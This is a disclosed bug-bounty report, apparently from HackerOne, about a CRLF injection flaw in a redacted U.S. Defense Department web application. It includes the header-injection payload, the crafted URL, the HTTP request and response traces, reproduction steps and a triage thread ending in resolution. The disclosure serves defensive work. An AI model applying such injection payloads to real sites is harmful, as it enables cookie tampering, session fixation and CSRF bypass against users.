{"id":245485,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDU0ODU=","url":"https://hackerone.com/reports/245485","title":"CRLF Injection on ███████","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-07-03T09:53:59.590Z","submitted_at":"2017-07-03T09:53:59.590Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"twicedi","url":"/twicedi","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/137/256/a626d57f6616da68d19a09c985982ab0889019d7_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":16064,"url":"https://hackerone.com/deptofdefense","handle":"deptofdefense","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"U.S. Dept Of Defense","twitter_handle":"DC3VDP","website":"https://bit.ly/2Rt5QhM","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-12-02T19:01:30.276Z","bug_reporter_agreed_on_going_public_at":"2017-10-11T18:32:28.883Z","team_member_agreed_on_going_public_at":"2019-12-02T19:01:30.200Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:**\nThe web application hosted on the \"█████\" domain is affected by a carriage return line feeds (CRLF) injection vulnerability that could be used in combination with others. This issue could allow XSS via Cookie, bypass Double Submit Cookie csrf protection or Session Fixation on .█████████ domains web apps.\n\n**Description:**\nA CRLF Injection attack occurs when an attacker manages to submit a CRLF into an application. \nThese two special characters represent the End of Line (EOL) marker for many internet protocols, including HTTP. Web applications typically split headers based on where the CRLF character sequence is found. Therefore, if a malicious user is able to inject their own CRLF sequence into an HTTP stream, they gain control over the contents of the HTTP response.\nIn this case this is could be done by modifying an HTTP request directed to the \"███\" adding, for example, the following payload:\n\n\u003e %0D%0ASet-Cookie:test2=test;domain=.████\n\nWith the preceding payload, an attacker is going to set, on the victim's browser that is visiting the malicious URL, a new cookie with an arbitrary value. Note that the scope of this cookie include all \".█████\" subdomains, so this cookie is going to be sent, by the browser, to all the subdomains.\n\nURL: http://████/advanced%0D%0ASet-Cookie:test2=test;domain=.█████\n\nGenerated request:\n```\nGET /advanced%0D%0ASet-Cookie:test2=test;domain=.████ HTTP/1.1\nHost: ██████████\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3\nConnection: close\nUpgrade-Insecure-Requests: 1\n```\n\nResponse (note the \"Set-Cookie\" header):\n```\nHTTP/1.1 302 Found\nDate: Mon, 03 Jul 2017 08:55:53 GMT\nServer: Apache\nLocation: http://www.█████████:80/advanced\nContent-Length: 267\nContent-Type: text/html; charset=iso-8859-1\nmy_cache-control: no-cache\nmy_pragma: no-cache\nConnection: close\nSet-Cookie: test2=test;domain=.█████████\n\n\u003c!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"\u003e\n\u003chtml\u003e\u003chead\u003e\n\u003ctitle\u003e302 Found\u003c/title\u003e\n\u003c/head\u003e\u003cbody\u003e\n\u003ch1\u003eFound\u003c/h1\u003e\n\u003cp\u003eThe document has moved \u003ca href=\"http://www.███:80/advanced\nSet-Cookie:test2=test;domain=.█████████\"\u003ehere\u003c/a\u003e.\u003c/p\u003e\n\u003c/body\u003e\u003c/html\u003e\n```\n\nAt this poin the new cookie is set on the browser, and it is going to be sent in every request, as showed in the following examples.\n\nRequest to the same subdomain ( http://www.███████/advanced ):\n```\nGET /advanced HTTP/1.1\nHost: www.██████████\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0\nAccept: */*\nAccept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3\nContent-Type: application/x-www-form-urlencoded\nCookie: JSESSIONID=F48C86E41595456012C5228F2A807BCC; test2=test\nConnection: close\n```\n\nRequest to another █████████ subdomain ( http://www.█████ ):\n```\nGET / HTTP/1.1\nHost: www.█████\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3\nCookie: test2=test\nConnection: close\nUpgrade-Insecure-Requests: 1\n```\n\n## Impact\nThis vulnerability could be chained with other issues allowing for example:\n1) XSS via Cookie: for example in case in which the value of the cookie is reflected somewhere without output encoding\n2) bypass Double Submit Cookie CSRF protection: in case in which an application use this solution as CSRF protection\n3) Session Fixation: if an application is not renewing the session cookie (for example JSESSIONID) after the login.\nNote that, in the preceding example, it is showed how an attacker could set an arbirtary cookie valid for all the .███████ subdomains so, after the cookie is set, the exploitation could be carried on other subdomains.\n\n## Step-by-step Reproduction Instructions\n\n1. Open the following URL with Firefox: http://██████/advanced%0D%0ASet-Cookie:test2=test;domain=.██████████\n2. A new cookie is going to be set\n3. This cookie is going to be sent on all the .█████████ subdomains\n\n## Product, Version, and Configuration (If applicable)\nThe exploitability of the issue has been tested with the latest version (at the time of writing) of the following browsers:\n\n\u003e Firefox (v54.0)\n\u003e Microsoft Edge\n\n## Suggested Mitigation/Remediation Actions\nTo mitigate this issue, the application should strip out any input which contains the **%0D%0A** URL encoded characters.\n\nI'm available for further clarification,\n\nBest,\nDavide","weakness":{"id":69,"name":"CRLF Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":3,"voters":["wisp","impramodsargar","collinsmarra"],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1798834,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Greetings from the Department of Defense (DoD),\n\nThank you for supporting the DoD Vulnerability Disclosure Program (VDP).\n\nBy submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.\n\nThe VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.\n\nWe will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.\n\nOur goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.\n\nRegards,\n\nThe VDP Team","automated_response":true,"created_at":"2017-07-03T09:53:59.785Z","updated_at":"2017-07-03T09:53:59.785Z","actor":{"url":"/deptofdefense","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"U.S. Dept Of Defense"}},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1799824,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2017-07-03T17:10:43.710Z","updated_at":"2017-07-03T17:10:43.710Z","additional_data":{"old_severity":null,"new_severity":"Medium","old_severity_id":null,"new_severity_id":55704},"actor":{"username":"bwluebberthill","cleared":false,"url":"/bwluebberthill","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1799825,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Greetings,\n\nWe have validated the vulnerability you reported and are preparing to forward this report to the affected DoD system owner for resolution.\n\nThank you for bringing this vulnerability to our attention!\n\nWe will endeavor to answer any questions the system owners may have regarding this report; however, there is a possibility we will need to contact you if they require more information to resolve the vulnerability.\n\nYou will receive another status update after we have confirmed your report has been resolved by the system owner. If you have any questions, please let me know.\n\nThanks again for supporting the DoD Vulnerability Disclosure Program.\n\nRegards,\n\nThe VDP Team","automated_response":false,"created_at":"2017-07-03T17:10:45.960Z","updated_at":"2017-07-03T17:10:45.960Z","actor":{"username":"bwluebberthill","cleared":false,"url":"/bwluebberthill","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1955266,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@twicedi\nGreetings,\n\nWe have been advised that the vulnerability you reported has been resolved. Before we close this report, we would appreciate it if you could confirm that the vulnerability no longer exists.\n\nIf we do not receive a response within two weeks, we will send you a second request. If we do not receive a response from you within two weeks of the second notice, we will close this report as resolved.\n\nIf you do not believe this vulnerability has been effectively resolved or if you have any questions, please let us know.\n\nThank you for your time and effort to improve the security of the DoD information network.\n\nRegards,\n\nThe VDP Team","automated_response":false,"created_at":"2017-08-25T17:19:38.086Z","updated_at":"2017-08-25T17:19:38.086Z","actor":{"username":"opimentelsei","cleared":false,"url":"/opimentelsei","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1984944,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@twicedi \nGreetings,\n\nWe previously sent a request asking you to confirm that the vulnerability you reported has been resolved. We would like your confirmation before closing this report.\n\nIf we do not receive a response to this second request within two weeks, we will close this report as resolved.\n\nIf you do not believe this vulnerability has been effectively resolved or if you have any questions, please let us know.\n\nThank you for your time and effort to improve the security of the DoD information network.\n\nRegards,\n\nThe VDP Team","automated_response":false,"created_at":"2017-09-08T13:03:51.525Z","updated_at":"2017-09-08T13:03:51.525Z","actor":{"username":"opimentelsei","cleared":false,"url":"/opimentelsei","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1990038,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the update @opimentelsei, I'm sorry for the delay,\n\nI can confirm that the issue is no longer exploitable.\n\nBest,\nDavide","automated_response":false,"created_at":"2017-09-11T19:02:07.081Z","updated_at":"2017-09-11T19:02:07.081Z","actor":{"username":"twicedi","cleared":false,"url":"/twicedi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/137/256/a626d57f6616da68d19a09c985982ab0889019d7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1991600,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Good news!\n\nThe vulnerability you reported is considered resolved and this report is now closed. If you have any questions, please let me know.\n\nThank you for your time and effort to improve the security of the DoD information network.\n\nRegards,\n\nThe VDP Team","automated_response":false,"created_at":"2017-09-12T13:03:55.774Z","updated_at":"2017-09-12T13:03:55.774Z","actor":{"username":"opimentelsei","cleared":false,"url":"/opimentelsei","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"twicedi","url":"/twicedi"},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2059559,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Can we disclose it?\n\nThanks!\nBest,\nDavide","automated_response":false,"created_at":"2017-10-11T18:32:28.907Z","updated_at":"2017-10-11T18:32:28.907Z","first_to_agree":true,"actor":{"username":"twicedi","cleared":false,"url":"/twicedi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/137/256/a626d57f6616da68d19a09c985982ab0889019d7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6450568,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Approved for disclosure. Thanks for your participation in the DoD Vulnerability Disclosure Program (VDP). Please follow us on Twitter @DC3VDP","automated_response":false,"created_at":"2019-12-02T19:01:30.213Z","updated_at":"2019-12-02T19:01:30.213Z","actor":{"username":"agent-1","cleared":false,"url":"/agent-1","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/379/490/775a471f25ef037fbf277e8b5d5a50bbb9e9ab56_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6450569,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-12-02T19:01:30.292Z","updated_at":"2019-12-02T19:01:30.292Z","actor":{"username":"agent-1","cleared":false,"url":"/agent-1","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/379/490/775a471f25ef037fbf277e8b5d5a50bbb9e9ab56_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}